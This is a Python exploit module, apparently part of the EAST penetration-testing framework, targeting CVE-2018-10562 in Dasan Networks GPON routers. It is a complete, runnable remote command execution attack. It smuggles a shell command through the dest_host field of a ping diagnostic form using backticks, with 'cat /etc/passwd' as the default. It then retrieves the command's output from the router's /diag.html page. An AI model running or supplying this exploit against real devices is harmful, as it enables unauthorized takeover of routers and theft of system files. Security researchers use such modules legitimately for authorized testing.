#!/usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import os
import time
import urllib
import urllib2
from collections import OrderedDict

import sys
sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_dasan_networks_gpon_routers_rce"
INFO['DESCRIPTION'] = "Dasan Networks GPON Routers - Remote Command Execution"
INFO['VENDOR'] = "https://www.dasannetworks.com/"
INFO["CVE Name"] = "CVE-2018-10562"
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = ['https://www.exploit-db.com/exploits/44576/']
INFO['CHANGELOG'] = "07 May, 2018. Written by Gleg team."
INFO['PATH'] = "Exploits/Hardware/"
INFO["NOTES"] = """Command Injection can occur via the dest_host parameter in a diag_action=ping request to a GponForm/diag_Form URI. Because the router saves ping results in /tmp and transmits them to the user when the user revisits /diag.html, it's quite simple to execute commands and retrieve their output. 
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target Port')
OPTIONS["COMMAND"] = "cat /etc/passwd", dict(description = 'Command to execute on target')

class exploit(Sploit):
    def __init__(self,host="",port=0, ssl=False, logger=None):
        Sploit.__init__(self, logger=logger)

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST')
        self.port = int(self.args.get('PORT'))
        self.command = self.args.get("COMMAND")
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
    
    def run(self):
        self.args()
        self.log('Attacking ' + self.host)
        
        url = self.make_url('/GponForm/diag_Form?images/')
        cmd = urllib.quote('`{}`;{}'.format(self.command, self.command))
        post_data = 'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host={}&ipv=0'.format(cmd)
        
        try:
            fd = urllib2.urlopen(url, post_data)
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        self.log('Command sent. Wait 3 sec and get result')
        time.sleep(3)
        
        url = self.make_url('/diag.html?images/')
        try:
            fd = urllib2.urlopen(url)
            self.log('Result:')
            self.log(fd.read())
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.finish(True)
        

if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()